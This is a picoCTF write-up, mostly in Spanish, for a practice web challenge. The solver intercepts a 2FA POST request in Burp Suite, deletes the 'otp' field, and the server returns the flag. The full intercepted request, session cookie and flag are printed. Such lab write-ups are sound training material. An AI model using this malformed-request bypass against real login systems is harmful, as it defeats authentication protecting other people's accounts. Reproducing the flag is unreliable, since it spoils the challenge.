Try [here](http://titan.picoctf.net:61374/) to find the flag

Hints:
1.-Try using burpsuite to intercept request to capture the flag.
2.-Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

### Solucion
```
Entramos a BurpSuite con el link del sitio, hacemos el registro en la pagina sencilla, luego ponemos cualquier cosa en 2fa authentication y interceptamos el request, alli aparece este codigo:

POST /dashboard HTTP/1.1
Host: titan.picoctf.net:56122
Content-Length: 7
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://titan.picoctf.net:56122
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:56122/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwtjMsOgyAQRf-FdRcCEqC7Lrqr32CmMEajMgakjzT9945Jl-fcnPsRYdrf4iw6WuElTiKUPPQ7zZhYOgStbfAOQoiNb0yIgM54bb02g1etjKiUldwNdVn6BCtyds3TzIr2jcE6J51n3KCUJ-XIbqTlIrU65EgJ-1TXO2YeWqNa46xRx1YL5v_jreIDEonvDz31NLg.Z_b76Q._dsGUJ6c2eyb-htyT5bLAa6VkJ4
Connection: keep-alive

otp=Lol

Solo borramos el otp=Lol y damos que si al forward:

Welcome, Luevano you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_9090d63c}
```